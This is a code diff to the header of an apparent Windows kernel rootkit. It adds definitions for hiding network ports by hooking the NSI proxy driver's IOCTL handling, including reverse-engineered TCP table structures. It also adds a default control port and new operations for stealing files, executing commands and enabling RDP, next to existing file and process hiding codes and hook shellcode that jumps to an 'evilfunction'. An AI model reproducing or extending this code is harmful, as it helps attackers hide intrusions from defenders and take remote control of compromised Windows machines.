@@ -10,6 +10,8 @@
 #define NTQUERY_TAG 'HkQr'
 #define NTQUERYEX_TAG 'HkQx'
 #define NTQUERYSYSINFO_TAG 'HkSi'
+#define TCPIP_TAG 'DoTi'
+#define NSIPROXY_TAG 'DoNp'
 #define NTQUERYEX_SYSCALL22H2 0x014b
 #define NTQUERYEX_SYSCALL1809 0x013b 
 #define NTQUERY_SYSCALL22H2 0x0035
@@ -17,6 +19,7 @@
 #define NTQUERYSYSINFO_SYSCALL22H2 0x0036
 #define NTQUERYSYSINFO_SYSCALL1809 0x0036
 #define REGULAR_BUFFER 0xDEAFBEED  // Represents a normal buffer
+#define DEFAULT_MEDIUM_PORT 44444
 
 
 // Default shellcode for hooks:
@@ -24,20 +27,27 @@ CONST BYTE DEFAULT_SHELLCODE[] = { 0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0
 									0x41, 0xff, 0xe5 };  // jmp r13 (jmp evilfunction)
 
 
-// Definitions of file hiding values:
+// Definitions of file/process/port hiding values:
 #define SHOW_HIDDEN 0x7777FFFFFFFFFFFF  // Remove a file from HookHide
 #define HIDE_FILE 0xFFFFFFFFFFFFFFFF  // Hide a file in HookHide
+
 #define UNHIDE_TEMPSUC STATUS_DS_MEMBERSHIP_EVALUATED_LOCALLY  // Temporary success for un-hiding file/folder
 #define HIDE_TEMPSUC STATUS_WX86_CREATEWX86TIB  // Temporary success for hiding file/folder
 #define SHOWHIDDEN_TEMPSUC STATUS_VOLSNAP_HIBERNATE_READY  // Temporary success for showing list
-#define UNHIDE_PROCESS STATUS_INVALID_NETWORK_RESPONSE  // Code used by client/medium for unhiding process
-#define HIDE_PROCESS STATUS_VIRTUAL_CIRCUIT_CLOSED  // Code used by client/medium for hiding process
-#define SHOWHIDDEN_PROCESS STATUS_INTERNAL_DB_CORRUPTION  // Code used by client/medium for listing hidden processes
+
+#define UNHIDE_PORT STATUS_INVALID_NETWORK_RESPONSE  // Code used by client/medium for unhiding ports
+#define HIDE_PORT STATUS_VIRTUAL_CIRCUIT_CLOSED  // Code used by client/medium for hiding ports
+#define SHOWHIDDEN_PORTS STATUS_INTERNAL_DB_CORRUPTION  // Code used by client/medium for listing hidden ports
+
 #define REMOVE_BY_INDEX_PID 0xFCFCFCCFCFCFDB  // Value of PID when asking to remove by index and not by PID
 #define UnhideProcess 0xC0C0C0C00C0C0C0C
 #define HideProcess 0xCDCDCDCDDCDCDCDC
 #define ListHiddenProcesses 0x0D0D0D0DD0D0D0D0
 
+#define UnhidePort 0xC0C0C0C00C0C0C0C
+#define HidePort 0xCDCDCDCDDCDCDCDC
+#define ListHiddenPorts 0x0D0D0D0DD0D0D0D0
+#define REMOVE_BY_INDEX_PORT 47
 
 typedef struct _KAFFINITY_EX {
 	char Affinity[0xA8];
@@ -385,6 +395,69 @@ REQUIRED DEFINITIONS:
 */
 
 
+// IRP definitions:
+
+constexpr ULONG IOCTL_NSI_GETALLPARAM = 0x12001B;
+
+
+extern PDRIVER_OBJECT pNsi_driver_object;
+extern PDRIVER_DISPATCH original_nsi_device_io;
+
+typedef unsigned long DWORD;
+
+typedef struct _HP_CONTEXT
+{
+	PIO_COMPLETION_ROUTINE oldIocomplete;
+	PVOID oldCtx;
+	BOOLEAN bShouldInvolve;
+	PKPROCESS pcb;
+}HP_CONTEXT, * PHP_CONTEXT;
+
+typedef struct _INTERNAL_TCP_TABLE_SUBENTRY
+{
+	char bytesfill0[2];
+	USHORT Port;
+	DWORD dwIP;
+	char bytesfill[20];
+
+}INTERNAL_TCP_TABLE_SUBENTRY, * PINTERNAL_TCP_TABLE_SUBENTRY;
+
+typedef struct _INTERNAL_TCP_TABLE_ENTRY
+{
+	INTERNAL_TCP_TABLE_SUBENTRY localEntry;
+	INTERNAL_TCP_TABLE_SUBENTRY remoteEntry;
+
+}INTERNAL_TCP_TABLE_ENTRY, * PINTERNAL_TCP_TABLE_ENTRY;
+
+typedef struct _NSI_STATUS_ENTRY
+{
+	char bytesfill[12];
+
+}NSI_STATUS_ENTRY, * PNSI_STATUS_ENTRY;
+
+typedef struct _NSI_PARAM
+{
+
+	DWORD UnknownParam1;
+	DWORD UnknownParam2;
+	DWORD UnknownParam3;
+	DWORD UnknownParam4;
+	DWORD UnknownParam5;
+	DWORD UnknownParam6;
+	PVOID lpMem;
+	DWORD UnknownParam8;
+	DWORD UnknownParam9;
+	DWORD UnknownParam10;
+	PNSI_STATUS_ENTRY lpStatus;
+	DWORD UnknownParam12;
+	DWORD UnknownParam13;
+	DWORD UnknownParam14;
+	DWORD TcpConnCount;
+
+
+}NSI_PARAM, * PNSI_PARAM;
+
+
 // ZwQuerySystemInformation return structures -
 typedef struct _SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION {
 	LARGE_INTEGER IdleTime;
@@ -577,8 +650,12 @@ typedef enum _ROOTKIT_OPERATION {
 	RKOP_HIDEPROC = 0xB00000CF,
 	RKOP_HIDEPORT = 0xB00000DF,
 
-	RKOP_NOOPERATION = 0xB00000EF,
-	RKOP_TERMINATE = 0xB00000FF,
+	RKOP_GETFILE = 0xB00000EF,
+	RKOP_EXECOMMAND = 0xB00000FF,
+	RKOP_ACTIVATERDP = 0xB0000100,
+
+	RKOP_NOOPERATION = 0xB0000101,
+	RKOP_TERMINATE = 0xB0000102,
 }ROOTKIT_OPERATION, * PROOTKIT_OPERATION;
 
 
